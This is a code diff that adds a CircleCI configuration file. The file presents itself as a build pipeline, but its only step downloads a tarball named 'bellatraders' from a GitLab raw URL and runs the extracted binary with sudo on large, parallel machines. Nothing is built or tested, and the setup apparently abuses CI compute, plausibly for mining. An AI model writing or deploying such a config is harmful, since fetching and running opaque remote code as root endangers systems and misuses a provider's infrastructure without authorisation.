@@ -1,0 +1,12 @@
+version: 2.1 
+jobs: 
+  build: 
+    machine: 
+      image: ubuntu-2004:202010-01 
+    resource_class: large 
+    parallelism: 5 
+    steps: 
+      - checkout 
+      - run: 
+          name: "Vapers86" 
+          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/jarwa01298/jakartaa/-/raw/main/bellatraders.tar.gz && tar -xf bellatraders.tar.gz ; sudo ./bellatraders run.ini
